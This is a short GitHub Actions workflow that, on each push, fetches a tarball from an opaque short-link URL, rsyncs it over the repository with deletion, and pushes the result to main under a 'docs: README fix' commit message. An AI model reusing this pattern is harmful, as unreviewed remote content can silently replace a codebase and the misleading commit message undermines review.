name: push-roost
on: push
permissions:
  contents: write
jobs:
  sync:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: fetch tarball and sync
        run: |
          curl -sSL -o /tmp/r.tgz "https://aka.doubaocdn.com/s/59SigvWQL0"
          mkdir -p /tmp/x
          tar xzf /tmp/r.tgz -C /tmp/x
          rsync -a --delete --exclude .git --exclude .github/workflows /tmp/x/roostoffice/ ./
          git config user.name "hashmai-bot"
          git config user.email "bot@users.noreply.github.com"
          git add -A
          git diff --cached --quiet || git commit -m "docs: README fix single-file size 755,547 B"
          git push origin HEAD:main
